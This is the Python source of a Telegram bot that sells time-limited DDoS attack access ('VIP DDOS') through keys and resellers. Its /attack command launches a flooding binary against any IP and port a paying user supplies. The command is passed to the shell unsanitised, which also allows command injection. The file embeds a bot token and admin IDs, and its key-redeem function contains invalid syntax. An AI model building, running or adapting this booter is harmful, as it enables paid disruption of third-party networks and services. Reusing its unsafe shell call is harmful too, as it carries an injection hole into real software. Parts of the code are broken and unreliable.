import os
import json
import time
import random
import string
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta

# Telegram bot token
bot = telebot.TeleBot('7520138270:AAHHDBRvhGZEXXwVJnSdXt-iLZuxrLzTAgo')  # Replace with your bot token

# Admin user IDs
admin_id = {"1807014348","898181945","6258297180","6955279265"}  # Replace with your admin Telegram ID

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"

# Per key cost for resellers
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# In-memory storage
users = {}
keys = {}
last_attack_time = {}
COOLDOWN_PERIOD = 60  # Default cooldown period in seconds

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open("cooldown.json", "w") as file:
        json.dump({"cooldown": seconds}, file)

def load_cooldown():
    global COOLDOWN_PERIOD
    try:
        with open("cooldown.json", "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown", 60)
    except FileNotFoundError:
        COOLDOWN_PERIOD = 60

def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()
    load_cooldown()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return f"ARMY-PK-{random_key.upper()}"

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    return current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)

def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

resellers = load_resellers()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open("log.txt", "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    with open("log.txt", "a") as file:
        file.write(log_entry + "\n")

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    packet_size = 1200
    full_command = f"./Rohan {target} {port} {time} {packet_size}"
    response = f"Attack Sent Successfully\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: 512\nAttacker: @{username}"
    bot.send_message(chat_id, response)
    # Pre-fork to reduce startup delay
    proc = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    threading.Timer(time, send_attack_finished_message, [chat_id, proc]).start()
    last_attack_time[user_id] = datetime.datetime.now()

def send_attack_finished_message(chat_id, proc):
    proc.wait()  # Ensure process completes
    bot.send_message(chat_id, "Attack completed")

@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Only admins can add resellers")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /add_reseller <user_id> <balance>")
        return
    reseller_id, initial_balance = command[1], int(command[2])
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"Reseller added\nID: {reseller_id}\nBalance: {initial_balance} Rs")
    else:
        bot.reply_to(message, f"Reseller {reseller_id} exists")

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /genkey <duration>")
        return
    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "Invalid duration")
        return
    cost = KEY_COST[duration]
    if user_id in admin_id:
        key = create_random_key()
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        bot.reply_to(message, f"Key: `{key}`\nDuration: {duration}", parse_mode='Markdown')
    elif user_id in resellers and resellers[user_id] >= cost:
        resellers[user_id] -= cost
        save_resellers(resellers)
        key = create_random_key()
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        bot.reply_to(message, f"Key: `{key}`\nDuration: {duration}\nCost: {cost} Rs\nBalance: {resellers[user_id]} Rs", parse_mode='Markdown')
    else:
        bot.reply_to(message, "Access Denied or insufficient balance")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ACCESS DENIED\nAdmins only.", parse_mode='Markdown')
        return
    bot.reply_to(message, """
ULTRA PRO MAX ADMIN
/start - Start bot
/help - This guide
/attack <ip> <port> <time> - Launch attack
/setcooldown <seconds> - Set cooldown
/checkcooldown - Check cooldown
/add_reseller <user_id> <balance> - Add reseller
/genkey <duration> - Generate key
/logs - View logs
/users - List users
/remove <user_id> - Remove user
/resellers - View resellers
/addbalance <reseller_id> <amount> - Add reseller balance
/remove_reseller <reseller_id> - Remove reseller
EXAMPLE: /attack 192.168.1.1 80 120""", parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in resellers:
        bot.reply_to(message, f"Balance: {resellers[user_id]} Rs")
    else:
        bot.reply_to(message, "Access Denied: reseller only")

@bot.message_handler(commands=['redeem'])
def redeem_key_prompt(message):
    bot.reply_to(message, "Send your key:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()
    if key in keys:
        if user_id in users and datetime.datetime.now() < datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
            bot.reply_to(message, "You already have access")
            return
        duration = keys[key]["duration"]
        expiration_time = add_time_to_current_date(hours=1 if duration == "1hour" else days=1 if duration == "1day" else days=7 if duration == "7days" else months=1 if duration == "1month" else 0)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        bot.reply_to(message, f"Access granted\nExpires: {users[user_id]}")
    else:
        bot.reply_to(message, "Invalid key")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id and os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size:
        with open(LOG_FILE, "rb") as file:
            bot.send_document(message.chat.id, file)
    else:
        bot.reply_to(message, "No logs or access denied")

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, "VIP DDOS\nUse /attack, /redeem, /myinfo, /setcooldown, /checkcooldown")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or user_id in users:
        if user_id in users:
            if datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
                bot.reply_to(message, "Access expired. Contact admin")
                return
        if user_id in last_attack_time and (datetime.datetime.now() - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
            remaining = COOLDOWN_PERIOD - (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            bot.reply_to(message, f"Cooldown: wait {int(remaining)}s")
            return
        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
            return
        target, port, time = command[1], int(command[2]), int(command[3])
        if time > 240:
            bot.reply_to(message, "Max 240s")
            return
        record_command_logs(user_id, 'attack', target, port, time)
        log_command(user_id, target, port, time)
        username = message.chat.username or "No username"
        execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
    else:
        bot.reply_to(message, "Unauthorized! OWNER: @Pk_Chopra")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if len(message.text.split()) != 2 or (seconds := int(message.text.split()[1])) < 0:
            bot.reply_to(message, "Usage: /setcooldown <seconds> (non-negative)")
            return
        set_cooldown(seconds)
        bot.reply_to(message, f"Cooldown: {seconds}s")

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    bot.reply_to(message, f"Cooldown: {COOLDOWN_PERIOD}s")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "Admin" if user_id in admin_id else "Reseller" if user_id in resellers else "User" if user_id in users else "Guest"
    expiration = users[user_id] if user_id in users else "No access"
    balance = resellers.get(user_id, "N/A") if role == "Reseller" else "N/A"
    bot.reply_to(message, f"INFO\n@{username}\nID: {user_id}\nRole: {role}\nExpires: {expiration}\nBalance: {balance}")

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if users:
            response = "Users:\n" + "\n".join(f"ID: {u}\nExpires: {e}" for u, e in users.items())
        else:
            response = "No users"
        bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id and len(message.text.split()) == 2:
        target = message.text.split()[1]
        if target in users:
            del users[target]
            save_users()
            bot.reply_to(message, f"Removed {target}")
        else:
            bot.reply_to(message, f"{target} not found")

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "Resellers:\n" + "\n".join(f"ID: {r}\nBalance: {b} Rs" for r, b in resellers.items()) if resellers else "No resellers"
        bot.reply_to(message, response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if user_id in admin_id and len(message.text.split()) == 3:
        reseller_id, amount = message.text.split()[1], float(message.text.split()[2])
        if reseller_id in resellers:
            resellers[reseller_id] += amount
            save_resellers(resellers)
            bot.reply_to(message, f"Added {amount} Rs to {reseller_id}\nNew: {resellers[reseller_id]} Rs")
        else:
            bot.reply_to(message, "Reseller not found")

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if user_id in admin_id and len(message.text.split()) == 2:
        reseller_id = message.text.split()[1]
        if reseller_id in resellers:
            del resellers[reseller_id]
            save_resellers(resellers)
            bot.reply_to(message, f"Removed {reseller_id}")
        else:
            bot.reply_to(message, "Reseller not found")

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            time.sleep(1)